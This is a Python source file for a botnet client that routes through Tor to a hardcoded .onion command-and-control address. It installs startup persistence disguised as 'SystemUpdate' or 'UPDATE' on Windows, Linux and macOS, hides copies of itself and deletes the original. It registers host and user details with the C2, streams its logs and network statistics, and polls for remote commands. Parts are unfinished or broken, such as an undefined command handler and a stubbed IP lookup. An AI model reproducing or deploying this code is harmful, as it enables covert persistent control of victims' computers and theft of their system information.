import argparse
import base64
import csv
import getpass
import io
import ipaddress
import json
import logging
import os
import platform
import random
import shutil
import socket
import socks
import stat
import subprocess
import sys
import tarfile
import threading
import time
import urllib.request
import zipfile
from pathlib import Path
from subprocess import PIPE, Popen
from typing import Optional

import cv2
import pgpy
import psutil
import requests
import stem
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from netaddr import IPAddress, IPNetwork
from scapy.all import ARP, Ether, ICMP, IP, TCP, sr

import blockchain_utils
from ghost_comm_lib.client.client import Client as GhostCommClient

# Tor Expert Bundle URLs
TOR_URLS = {
    "Windows_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-windows-x86_64-14.5.6.tar.gz",
    "Windows_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-windows-i686-14.5.6.tar.gz",
    "MAC-OSx_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-macos-x86_64-14.5.6.tar.gz",
    "MAC-OSx_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-macos-i686-14.5.6.tar.gz",
    "Linux_86_64": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-linux-x86_64-14.5.6.tar.gz",
    "Linux_i686": "https://dist.torproject.org/torbrowser/14.5.6/tor-expert-bundle-linux-i686-14.5.6.tar.gz"
}

TOR_FOLDER = "TorExpert"
TOR_EXE_NAME = "tor.exe"        # Only for Windows
TOR_BIN_NAME = "tor"            # Linux/macOS binary name
TOR_HOST = "127.0.0.1"
TOR_PORT = 9050

DEFAULT_CONTROL_URL = "http://zidveflgk5ab3mfoqgmq35fulrmklpbbdexpfj2lscdbqmqruqjz2qyd.onion"
_control_url_lock = threading.Lock()
_current_control_url = DEFAULT_CONTROL_URL

def get_current_control_url():
    """Return the most recent control URL the bot knows about."""
    with _control_url_lock:
        return _current_control_url

def update_control_url(new_url):
    """Update the control URL if the server provides a new one."""
    if not new_url:
        return

    sanitized = new_url.strip()
    if not sanitized:
        return

    global _current_control_url
    with _control_url_lock:
        if sanitized != _current_control_url:
            logging.getLogger('ControlURL').info(f"Control URL updated to {sanitized}")
            _current_control_url = sanitized

def build_c2_url(path_fragment):
    """Build a full C2 URL for the given path fragment."""
    base = get_current_control_url().rstrip('/')
    fragment = path_fragment.lstrip('/')
    return f"{base}/{fragment}"

def debug(msg):
    print(f"[DEBUG] {msg}")

def go_to_root():
    """Change working directory to the filesystem root (OS-agnostic)."""
    root_dir = os.path.abspath(os.sep)
    try:
        os.chdir(root_dir)
        print(f"[INFO] Changed working directory to root: {root_dir}")
    except Exception as e:
        print(f"[ERROR] Could not change to root dir: {e}")
        sys.exit(1)

def download_file(url, dest):
    if os.path.exists(dest):
        debug(f"{dest} already exists, skipping download.")
        return
    debug(f"Downloading {url} to {dest}...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response, open(dest, "wb") as out_file:
            out_file.write(response.read())
        debug("Download succeeded.")
    except Exception as e:
        print(f"[!] Download failed: {e}")
        sys.exit(1)

def extract_tar_gz(tar_path, extract_to):
    debug(f"Extracting {tar_path} to {extract_to}...")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=extract_to)
    debug("Extraction complete.")

def find_tor_binary(base_folder, bin_name):
    for root, dirs, files in os.walk(base_folder):
        if bin_name in files:
            return os.path.join(root, bin_name)
    return None

def detect_platform_key():
    system = platform.system()
    arch = platform.machine().lower()  # normalize

    if system == "Windows":
        if arch in ("amd64", "x86_64"):
            return "Windows_86_64"
        elif arch in ("i386", "i686", "x86"):
            return "Windows_i686"
    elif system == "Darwin":
        if arch == "x86_64":
            return "MAC-OSx_86_64"
        elif arch in ("i386", "i686"):
            return "MAC-OSx_i686"
        elif arch == "arm64":
            print("[!] macOS ARM64 detected, no prebuilt Tor bundle in TOR_URLS")
            sys.exit(1)
    elif system == "Linux":
        if arch in ("x86_64", "amd64"):
            return "Linux_86_64"
        elif arch in ("i386", "i686", "x86"):
            return "Linux_i686"
        elif arch in ("arm64", "aarch64"):
            print("[!] Linux ARM64 detected, no prebuilt Tor bundle in TOR_URLS")
            sys.exit(1)
    print(f"[!] Unsupported system/arch: {system} ({arch})")
    sys.exit(1)

def prepare_tor():
    print("[DEBUG_PT] - PREPARING TOR...")

    # First, check if Tor exists in the system PATH
    system = platform.system()
    tor_in_path = None
    if system == "Windows":
        tor_in_path = shutil.which("tor.exe")
    else:
        tor_in_path = shutil.which("tor")

    if tor_in_path:
        print(f"[DEBUG_PT] - SYSTEM TOR FOUND: {tor_in_path}")
        tor_path = tor_in_path
        return tor_path  # Use system-installed Tor

    # Tor not found system-wide; proceed with local Expert Bundle setup
    os.makedirs(TOR_FOLDER, exist_ok=True)
    print(f"[DEBUG_PT] - TOR FOLDER exists: {TOR_FOLDER}")

    platform_key = detect_platform_key()  # e.g., "Linux_86_64"
    bin_name = TOR_EXE_NAME if "Windows" in platform_key else TOR_BIN_NAME
    tar_path = os.path.join(TOR_FOLDER, "tor_expert.tar.gz")
    final_bin_folder = os.path.join(TOR_FOLDER, bin_name)
    final_bin_path = os.path.join(final_bin_folder, bin_name)

    # Debug checks
    print(f"[DEBUG_PT] - TAR PATH: {tar_path}")
    print(f"[DEBUG_PT] - BIN NAME: {bin_name}")
    print(f"[DEBUG_PT] - FINAL TOR PATH: {final_bin_path}")

    # Search for existing binary inside TorExpert
    extracted_bin = find_tor_binary(TOR_FOLDER, bin_name)
    if extracted_bin:
        print(f"[DEBUG_PT] - EXISTING BINARY FOUND: {extracted_bin}")
    else:
        print("[DEBUG_PT] - NO EXISTING BINARY FOUND")
        download_file(TOR_URLS[platform_key], tar_path)
        extract_tar_gz(tar_path, TOR_FOLDER)
        extracted_bin = find_tor_binary(TOR_FOLDER, bin_name)

        if not extracted_bin or not os.path.isfile(extracted_bin):
            print(f"[!] Tor binary '{bin_name}' not found after extraction in {TOR_FOLDER}")
            sys.exit(1)
        else:
            print(f"[DEBUG_PT] - EXTRACTED BINARY FOUND: {extracted_bin}")

    # Ensure binary folder exists
    os.makedirs(final_bin_folder, exist_ok=True)

    # Move binary to final path if needed
    if extracted_bin != final_bin_path:
        try:
            shutil.move(extracted_bin, final_bin_path)
            print(f"[DEBUG_PT] - MOVED BINARY TO FINAL PATH: {final_bin_path}")
        except shutil.Error:
            print(f"[DEBUG_PT] - Binary already exists at {final_bin_path}, using existing one")

    # Set execute permission on Unix
    if "Windows" not in platform_key:
        os.chmod(final_bin_path, 0o755)
        print(f"[DEBUG_PT] - Set execute permissions on {final_bin_path}")

    # Final debug
    print(f"[DEBUG_PT] - USING TOR BINARY AT: {final_bin_path}")
    return final_bin_path

tor_path = prepare_tor()
print("Tor Path: ",tor_path)
def start_tor(tor_path):
    print("Starting Tor")

    print("USING PATH:", tor_path)
    debug("Preparing torrc...")
    torrc_path = os.path.join(TOR_FOLDER, "torrc")
    if not os.path.exists(torrc_path):
        with open(torrc_path, "w") as f:
            f.write("SocksPort 9050\nLog notice stdout\nDisableNetwork 0\nAvoidDiskWrites 1\n")

    debug("Starting Tor daemon...")
    try:
        subprocess.Popen([tor_path, "-f", torrc_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        debug("Waiting for Tor to listen on port 9050...")
        for i in range(120):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                if s.connect_ex((TOR_HOST, TOR_PORT)) == 0:
                    debug(f"Tor is ready on port 9050 after {i+1} seconds.")
                    return
            time.sleep(1)
        print("[!] Tor did not start within 2 minutes.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Failed to start Tor: {e}")
        sys.exit(1)

def make_persistent():
    """
    Sets up the script to auto-run on system startup.
    On Windows, adds a batch file to the Startup folder.
    On Linux/macOS, skips for safety (can be added if desired).
    """
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    if system == "Windows":
        startup_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft\Windows\Start Menu\Programs\Startup"
        )
        os.makedirs(startup_path, exist_ok=True)
        shortcut = os.path.join(startup_path, "SystemUpdate.bat")
        with open(shortcut, "w") as f:
            f.write(f'start "" python "{script_path}"\n')
        debug("Persistence set up successfully on Windows.")
    elif system == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        os.makedirs(autostart_dir, exist_ok=True)
        shortcut = os.path.join(autostart_dir, "SystemUpdate.desktop")
        with open(shortcut, "w") as f:
                    f.write(f"""[Desktop Entry]
        Type=Application
        Exec=python3 {script_path}
        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        Name=SystemUpdate
        Comment=Auto-start script
        """)
        debug("Persistence set up successfully on Linux.")
    elif system == "Darwin":  # macOS
        launch_agents = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(launch_agents, exist_ok=True)
        plist_path = os.path.join(launch_agents, "com.systemupdate.plist")
        with open(plist_path, "w") as f:
            f.write(f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
      <string>python3</string>
      <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>""")
        debug("Persistence set up successfully on macOS.")
    else:
        debug(f"Persistence setup skipped for unsupported system: {system}")

logger = logging.getLogger(__name__)

# --- Windows Persistence ---
def setup_persistence_windows():
    import winreg
    logger = logging.getLogger(__name__)
    logger.info("Setting up persistence for ALL users...")

    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "UPDATE"
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        # Open HKLM with write access
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY
        )
        # Create a hidden folder and copy the script
        hidden_folder = os.path.join(os.path.dirname(exe_path), ".UPDATE")
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder, exist_ok=True)
        copied_exe_path = os.path.join(hidden_folder, "update.py")
        shutil.copy(exe_path, copied_exe_path)

        # Verify the copy exists
        if os.path.exists(copied_exe_path):
            logger.info(f"Copied script verified: {copied_exe_path}")
            # Delete the original script
            os.remove(exe_path)
            logger.info(f"Original script deleted: {exe_path}")
            return copied_exe_path
        else:
            logger.error(f"Copy verification failed: {copied_exe_path}")

        winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, copied_exe_path)
        winreg.CloseKey(reg_key)

        logger.info("Persistence setup completed for ALL users.")
    except PermissionError:
        logger.error("Administrator privileges are required to set persistence for all users.")
    except Exception as e:
        logger.error(f"Unexpected error setting up persistence for all users: {e}")

# --- Linux Persistence ---
def get_user_home():
    system = platform.system()
    if system == "Windows":
        # Windows user home
        import winreg
        user = os.environ.get('USERNAME') or getpass.getuser()
        return os.path.join("C:\\Users", user)
    else:
        # Linux/macOS user home
        import pwd
        user = os.environ.get('SUDO_USER') or getpass.getuser()
        return pwd.getpwnam(user).pw_dir

def is_hidden_copy():
    script_path = os.path.abspath(__file__)
    return ".UPDATE" in script_path
    print(script_path)

def setup_persistence_linux():
    logger.info("Setting up persistence on Linux...")
    try:
        user_home = get_user_home()
        startup_dir = os.path.join(user_home, ".config", "autostart")

        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir, exist_ok=True)
            os.chmod(startup_dir, 0o777)  # Ensure full access
            logger.info(f"Created startup directory: {startup_dir} with 777 permissions")

        script_path = os.path.abspath(__file__)
        desktop_entry_path = os.path.join(startup_dir, "UPDATE.desktop")
        desktop_entry = f"""
[Desktop Entry]
Type=Application
Exec={os.path.join(startup_dir, ".UPDATE", "update.py")}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=UPDATE
Comment=Start UPDATE at login
"""

        if not os.path.exists(desktop_entry_path):
            with open(desktop_entry_path, 'w') as f:
                f.write(desktop_entry)
            os.chmod(desktop_entry_path, 0o777)  # Set permissions
            logger.info(f"Created persistence file: {desktop_entry_path} with 777 permissions")

        # Create a hidden folder and copy the script
        hidden_folder = os.path.join(startup_dir, ".UPDATE")
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder, exist_ok=True)
        copied_script_path = os.path.join(hidden_folder, "update.py")
        shutil.copy(script_path, copied_script_path)

        # Verify the copy exists
        if os.path.exists(copied_script_path):
            logger.info(f"Copied script verified: {copied_script_path}")
            # Delete the original script
            os.remove(script_path)
            logger.info(f"Original script deleted: {script_path}")
            return copied_script_path
        else:
            logger.error(f"Copy verification failed: {copied_script_path}")

        logger.info("Persistence setup completed on Linux.")
    except Exception as e:
        logger.error(f"Failed to set up persistence on Linux: {e}")

def run_file(file_path):
    """
    Runs a file, detecting type and using the proper method.
    Supports: Python scripts (.py), executables (.exe, .bin, etc.), and general binaries.
    """
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File not found: {file_path}")

    _, ext = os.path.splitext(file_path)
    ext = ext.lower()

    if ext == ".py":
        # Run Python script with current interpreter
        subprocess.run([sys.executable, file_path])
    elif os.access(file_path, os.X_OK) or ext in {".exe", ".bin"}:
        # Executable or binary
        subprocess.run([file_path])
    else:
        # Attempt to execute anyway (Linux may allow scripts without extension)
        subprocess.run([file_path])


# --- Main Persistence Function ---
def setup_persistence():
    logger.info("Setting up persistence...")
    system = platform.system()

    file_path = None  # Initialize

    if system == "Windows":
        file_path = setup_persistence_windows()
    elif system in ("Linux", "Darwin"):  # Darwin covers macOS
        file_path = setup_persistence_linux()
    else:
        logger.warning(f"Unsupported OS for persistence: {system}")

    if file_path:
        run_file(file_path)
    else:
        logger.error("Persistence setup did not return a valid file path.")

current_path = os.path.abspath(__file__) if not getattr(sys, 'frozen', False) else sys.executable

# Directory containing the script/executable
current_dir = os.path.dirname(current_path)


logger = logging.getLogger('Bot')

def register_with_c2(ghost_comm_client):
    logger.info(f"Attempting to register bot with C2...")
    try:
        info = {
            'os': platform.system(),
            'hostname': platform.node(),
            'user': getpass.getuser(),
            'ip': public_ip()
        }
        payload = {'type': 'register', 'info': info}
        response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
        response_data = json.loads(response.decode('utf-8'))
        if response_data.get('status') == 'ok':
            logger.info("Successfully registered with C2 server.")
            return response_data.get('bot_id')
        else:
            logger.error(f"Failed to register with C2: {response_data.get('message')}")
            return None
    except Exception as e:
        logger.exception(f"An unexpected error occurred during registration. Error: {e}")
        return None

def public_ip():
    # This function needs to be implemented to get the public IP of the bot
    return "127.0.0.1"

if __name__ == '__main__':
    debug("Starting Tor Expert Bundle automation script...")

    logger.info(f"Bot script started")
    try:
        if not is_hidden_copy():
            # Setup persistence and run the copied file
            print("Executing First Run From Directory: ", current_dir)
            copied_path = setup_persistence()  # ensure setup_persistence() returns the copied path
            if copied_path:
                run_file(copied_path)  # execute the hidden copy
            sys.exit(0)  # Exit the original script
        else:
            # Hidden copy: normal execution
            tor_exe_path = prepare_tor()
            start_tor(tor_path)
            make_persistent()
            debug("Tor initialised and running...REROUTING...")
            # Full absolute path to the current script/executable
            # Directory containing the script/executable

            print("Executing From Directory: ", current_dir)

            # --- Detailed Logging Configuration ---
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            logger = logging.getLogger('Bot')

            logger.info("Bot script started.")

            # --- Argument Parser ---
            parser = argparse.ArgumentParser(description='A bot that connects to a C2 server.')
            parser.add_argument('--output', default='output.txt', help='The name of the output file.')
            args = parser.parse_args()
            logger.debug(f"Arguments parsed: {args}")

            # --- Configuration ---
            def get_c2_address():
                logger.info("Attempting to determine C2 address...")
                # In a real scenario, this would involve querying the blockchain or a fallback mechanism
                # For now, we'll use the default onion address
                return DEFAULT_CONTROL_URL

            C2_SERVER = get_c2_address()
            BOT_ID = f"{platform.node()}-{os.getpid()}"
            ENCRYPTION_KEY = b'sixteen byte key'
            MODULES_DIR = 'MODULES'
            logger.debug(f"Bot ID set to: {BOT_ID}")
            logger.debug("Core configuration variables set.")

            # --- Ghost Comm Client ---
            ghost_comm_client = GhostCommClient(name=BOT_ID, email=f"{BOT_ID}@localhost")
            ghost_comm_client.primary_node_host = C2_SERVER
            ghost_comm_client.connect_to_primary_node()
            decrypted_payload = ghost_comm_client.request_lock_cycle_payload()
            ghost_comm_client.close_connection()

            # --- C2 Logging Handler ---
            class C2LogHandler(logging.Handler):
                def __init__(self, bot_id, ghost_comm_client):
                    super().__init__()
                    self.bot_id = bot_id
                    self.ghost_comm_client = ghost_comm_client

                def emit(self, record):
                    log_entry = self.format(record)
                    try:
                        payload = {'type': 'log', 'bot_id': self.bot_id, 'log_entry': log_entry}
                        self.ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                    except Exception:
                        # Can't log this error to C2, so just ignore it
                        pass

            def send_network_stats():
                while True:
                    try:
                        net_io = psutil.net_io_counters()
                        stats = {
                            'bytes_sent': net_io.bytes_sent,
                            'bytes_recv': net_io.bytes_recv
                        }
                        payload = {'type': 'net_stats', 'bot_id': BOT_ID, 'stats': stats}
                        ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                    except Exception as e:
                        logger.warning(f"Could not send network stats: {e}")
                    time.sleep(10)

            # --- Tor Connectivity Check ---
            def check_tor_connectivity():
                logger.info("Verifying Tor connectivity...")
                try:
                    logger.debug("Making request to https://check.torproject.org/api/ip via Tor proxy.")
                    response = requests.get("https://check.torproject.org/api/ip", proxies={'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}, timeout=120)
                    response.raise_for_status()
                    data = response.json()
                    logger.debug(f"Tor check response: {data}")
                    if data.get('IsTor'):
                        logger.info(f"Tor connectivity confirmed. External IP: {data.get('IP')}")
                        return True
                    else:
                        logger.warning(f"Connected, but not through Tor. IP: {data.get('IP')}")
                        return False
                except requests.exceptions.RequestException:
                    logger.exception("Tor connectivity check failed. Is the Tor service running on port 9050?")
                    return False
                except json.JSONDecodeError:
                    logger.exception("Failed to decode JSON response from Tor check.")
                    return False
                except Exception:
                    logger.exception("An unexpected error occurred during Tor connectivity check.")
                    return False

            def ping_c2(ghost_comm_client):
                while True:
                    try:
                        payload = {'type': 'ping', 'bot_id': BOT_ID}
                        response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                        response_data = json.loads(response.decode('utf-8'))
                        if response_data.get('status') == 'ok':
                            logger.info("Sent ping to C2.")
                        else:
                            logger.error(f"Failed to ping C2: {response_data.get('message')}")
                    except Exception as e:
                        logger.exception("An error occurred while sending ping to C2.")
                    time.sleep(10) # Ping every 10 seconds

            # Main loop
            while True:
                c2_log_handler = C2LogHandler(BOT_ID, ghost_comm_client)
                c2_log_handler.setLevel(logging.INFO)
                formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
                c2_log_handler.setFormatter(formatter)
                logging.getLogger().addHandler(c2_log_handler)

                logger.info("Bot main function started.")
                if not check_tor_connectivity():
                    logger.critical("Tor is not available... Awaiting C2 Startup...")
                    time.sleep(5)
                    continue

                # Register with C2
                bot_id = register_with_c2(ghost_comm_client)
                if not bot_id:
                    logger.error("Failed to register with C2. Retrying in 60 seconds...")
                    time.sleep(60)
                    continue

                BOT_ID = bot_id

                # Start network stats thread
                net_stats_thread = threading.Thread(target=send_network_stats, daemon=True)
                net_stats_thread.start()

                # Start ping thread
                ping_thread = threading.Thread(target=ping_c2, args=(ghost_comm_client,), daemon=True)
                ping_thread.start()

                logger.info("Polling C2 for commands (long poll)...")
                payload = {'type': 'poll', 'bot_id': BOT_ID}
                response = ghost_comm_client.send_data_through_distributed_proxy_chain(json.dumps(payload).encode('utf-8'))
                response_data = json.loads(response.decode('utf-8'))

                if response_data.get('status') == 'ok' and response_data.get('output') == 'no commands':
                    logger.debug("No commands available from C2.")
                    time.sleep(5)
                    continue

                if response_data.get('status') == 'ok':
                    command_obj_str = response_data['output']
                    logger.info("Encrypted command received from C2.")
                    command_obj = json.loads(command_obj_str)

                    with open(args.output, 'a') as f:
                        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Received command: {command_obj_str}\n")

                    handle_command(command_obj)
                else:
                    logger.warning(f"C2 returned an error: {response_data.get('message')}")
                    time.sleep(10)

    except KeyboardInterrupt:
        debug("Script interrupted by user.")
    except Exception as e:
        logger.error(f"Unhandled exception in __main__: {e}", exc_info=True)
